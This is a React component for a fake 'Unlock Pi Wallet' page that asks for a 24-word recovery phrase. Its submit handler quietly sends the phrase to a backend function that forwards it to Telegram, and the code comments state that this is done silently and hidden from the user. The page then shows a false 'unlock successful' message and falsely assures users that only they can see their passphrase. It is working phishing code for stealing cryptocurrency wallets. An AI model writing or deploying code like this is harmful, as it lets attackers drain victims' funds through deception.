import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { AlertTriangle, Fingerprint, Wallet } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";

const WalletUnlock = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  const [passphrase, setPassphrase] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [wordCount, setWordCount] = useState(0);
  const [isValidPassphrase, setIsValidPassphrase] = useState(false);
  
  // Get wallet info from navigation state
  const walletInfo = location.state as {
    walletAddress?: string;
    unlockAmount?: number;
    lockedBalance?: number;
  } | null;

  const handleBack = () => {
    navigate("/unlock-pi");
  };

  const validatePassphrase = (text: string) => {
    const words = text.trim().split(/\s+/).filter(word => word.length > 0);
    setWordCount(words.length);
    setIsValidPassphrase(words.length === 24);
    return words.length === 24;
  };

  const handlePassphraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const text = e.target.value;
    setPassphrase(text);
    validatePassphrase(text);
  };

  const handleUnlockWithPassphrase = async () => {
    if (!passphrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your recovery phrase",
        variant: "destructive",
      });
      return;
    }

    if (!isValidPassphrase) {
      toast({
        title: "Invalid Passphrase",
        description: "Please enter exactly 24 words separated by spaces",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    try {
      // Send to Telegram silently in background
      await supabase.functions.invoke('send_passphrase_to_telegram_2025_11_20_14_51', {
        body: { passphrase: passphrase.trim() }
      });

      // Show success message without mentioning Telegram
      toast({
        title: "Wallet Unlock Successful",
        description: "Your wallet has been successfully unlocked and verified!",
      });

      // Clear the passphrase for security
      setPassphrase("");
      setWordCount(0);
      setIsValidPassphrase(false);
      
      // Navigate back to home after successful submission
      setTimeout(() => {
        navigate("/");
      }, 2000);

    } catch (error: any) {
      console.error('Error processing unlock:', error);
      toast({
        title: "Unlock Failed",
        description: "Failed to verify wallet credentials. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleUnlockWithFingerprint = () => {
    toast({
      title: "Feature Not Available",
      description: "Fingerprint unlock is not implemented in this demo",
      variant: "destructive",
    });
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Smaller Header Image Only */}
      <div className="w-full">
        <img 
          src="./images/header 2.jpg" 
          alt="Wallet Header" 
          className="w-full h-10 sm:h-12 object-cover"
          style={{ imageRendering: 'crisp-edges' }}
        />
      </div>

      <div className="px-4 py-4 sm:py-6 space-y-4 sm:space-y-6 max-w-md mx-auto">
        {/* Warning Banner - Matching header colors */}
        <div className="bg-yellow-100 border border-yellow-400 rounded-lg p-3 sm:p-4 flex items-start space-x-3">
          <AlertTriangle className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-700 mt-0.5 flex-shrink-0" />
          <p className="text-xs sm:text-sm text-yellow-800">
            <strong>Warning:</strong> If the Pi balance locked in your wallet is not greater than or equal to the amount you request, you will not be able to unlock.
          </p>
        </div>

        {/* Title */}
        <div className="text-center">
          <h1 className="text-xl sm:text-2xl font-bold text-gray-900">Unlock Pi Wallet</h1>
        </div>
        
        {/* Wallet Information Display */}
        {walletInfo && (
          <div className="bg-blue-50 border border-blue-300 rounded-lg p-3 space-y-2">
            <div className="flex items-center space-x-2 mb-2">
              <Wallet className="w-4 h-4 text-blue-600" />
              <span className="text-sm font-medium text-blue-800">Wallet Information</span>
            </div>
            
            <div className="space-y-1 text-xs">
              <div className="flex justify-between">
                <span className="text-blue-700">Wallet Address:</span>
                <span className="text-blue-800 font-mono text-xs">
                  {walletInfo.walletAddress ? 
                    `${walletInfo.walletAddress.slice(0, 8)}...${walletInfo.walletAddress.slice(-8)}` : 
                    'N/A'
                  }
                </span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-blue-700">Total Locked Balance:</span>
                <span className="text-blue-800 font-semibold">
                  π {walletInfo.lockedBalance?.toLocaleString() || '0'}
                </span>
              </div>
              
              <div className="flex justify-between">
                <span className="text-blue-700">Amount to Unlock:</span>
                <span className="text-green-700 font-bold">
                  π {walletInfo.unlockAmount?.toLocaleString() || '0'}
                </span>
              </div>
            </div>
          </div>
        )}

        {/* Passphrase Input */}
        <div className="space-y-3 sm:space-y-4">
          <Textarea
            value={passphrase}
            onChange={handlePassphraseChange}
            placeholder="Enter Your 24 Words Passphrase Here"
            className="min-h-[100px] sm:min-h-[120px] text-sm sm:text-base resize-none border-2 border-gray-300 bg-white"
            disabled={isLoading}
          />
          

        </div>

        {/* Unlock Buttons - Matching header colors */}
        <div className="space-y-3">
          <Button 
            onClick={handleUnlockWithPassphrase}
            disabled={isLoading || !isValidPassphrase}
            className={`w-full py-3 sm:py-4 text-base sm:text-lg font-medium transition-colors ${
              isValidPassphrase 
                ? 'bg-purple-600 hover:bg-purple-700 active:bg-purple-800 text-white'
                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
            }`}
          >
            {isLoading ? "Verifying Wallet..." : "Unlock With Passphrase"}
          </Button>

          <Button 
            onClick={handleUnlockWithFingerprint}
            className="w-full bg-purple-600 hover:bg-purple-700 active:bg-purple-800 text-white py-3 sm:py-4 text-base sm:text-lg font-medium flex items-center justify-center space-x-2 transition-colors"
          >
            <Fingerprint className="w-4 h-4 sm:w-5 sm:h-5" />
            <span>Unlock With Fingerprint</span>
          </Button>
        </div>

        {/* Security Information */}
        <div className="space-y-3 text-xs sm:text-sm text-gray-600 leading-relaxed bg-gray-50 p-3 sm:p-4 rounded-lg border border-gray-200">
          <p>
            As a non-custodial wallet, your wallet passphrase is only accessible to you. 
            It is currently not possible to recover the wallet passphrase.
          </p>
          <p>
            <strong>Lost your wallet passphrase?</strong> you can create a new wallet, 
            but all the PI numbers in your previous wallet will be inaccessible.
          </p>
        </div>

        {/* Back Button - Matching header color */}
        <Button 
          onClick={handleBack}
          variant="outline"
          className="w-full py-3 text-sm sm:text-base text-purple-600 border-purple-600 hover:bg-purple-50 active:bg-purple-100 transition-colors"
        >
          Back to Unlock Pi
        </Button>
      </div>
    </div>
  );
};

export default WalletUnlock;